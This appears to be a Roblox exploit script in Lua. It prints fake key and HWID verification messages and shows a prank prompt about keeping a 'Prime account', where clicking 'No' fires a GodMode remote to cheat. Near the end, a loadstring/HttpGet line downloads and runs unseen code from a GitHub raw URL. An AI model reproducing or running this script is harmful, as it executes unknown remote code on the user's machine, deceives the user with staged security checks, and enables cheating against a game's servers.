local startTime = os.clock()

print("[[ Exoguard V3 || Exoguard V6.1.1 || Current Version ]]")
print("[[ Exoguard V3 || Exothium.xyz || Checking Key ]]")
print("[[ Exoguard V3 || Exothium.xyz || ###✅### ]]")
print("[[ Exoguard V3 || Exothium.xyz || Checking HWID ]]")
print("[[ Exoguard V3 || Exothium.xyz || ###✅### ]]")

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PrimeAccountGui"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local title = Instance.new("TextLabel")
title.Name = "Title"
title.Parent = screenGui
title.Size = UDim2.new(1, 0, 0.2, 0)
title.Position = UDim2.new(0, 0, 0, 0)
title.Text = "Do you want to keep your Prime account?"
title.TextScaled = true
title.Font = Enum.Font.Arimo
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)

local yesButton = Instance.new("TextButton")
yesButton.Name = "YesButton"
yesButton.Parent = screenGui
yesButton.Size = UDim2.new(0.2, 0, 0.1, 0)
yesButton.Position = UDim2.new(0.4, 0, 0.5, 0)
yesButton.Text = "Yes"
yesButton.TextScaled = true
yesButton.Font = Enum.Font.Arimo
yesButton.TextColor3 = Color3.fromRGB(255, 255, 255)
yesButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)

local noButton = Instance.new("TextButton")
noButton.Name = "NoButton"
noButton.Parent = screenGui
noButton.Size = UDim2.new(0.2, 0, 0.1, 0)
noButton.Position = UDim2.new(0.6, 0, 0.5, 0)
noButton.Text = "No"
noButton.TextScaled = true
noButton.Font = Enum.Font.Arimo
noButton.TextColor3 = Color3.fromRGB(255, 255, 255)
noButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)

local function randomizePositions()
    yesButton.Position = UDim2.new(math.random(), 0, math.random(), 0)
    noButton.Position = UDim2.new(math.random(), 0, math.random(), 0)
end

yesButton.MouseEnter:Connect(function()
    yesButton.Text = "No"
    yesButton.TextColor3 = Color3.fromRGB(255, 0, 0)
    randomizePositions()
end)

yesButton.MouseLeave:Connect(function()
    yesButton.Text = "Yes"
    yesButton.TextColor3 = Color3.fromRGB(255, 255, 255)
end)

local function onNoClicked()
    title.Text = "Alright then..."
    game:GetService("ReplicatedStorage").Remotes.GodMode:FireServer(true)
end

yesButton.MouseButton1Click:Connect(function()
    if yesButton.Text == "No" then
        onNoClicked()
    end
end)

noButton.MouseButton1Click:Connect(function()
    if noButton.Text == "No" then
        onNoClicked()
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/CilXA/B7FGF5X1AAA33FG/main/Main"))()

local elapsedTime = os.clock() - startTime
print("[[ Exoguard V3 || Exothium.xyz || Loading Script || Loaded in: " .. string.format("%.6f", elapsedTime) .. " secs ]]")
print("[[ Exoguard V3 || Exothium.xyz || Script Loaded Successfully ]]")
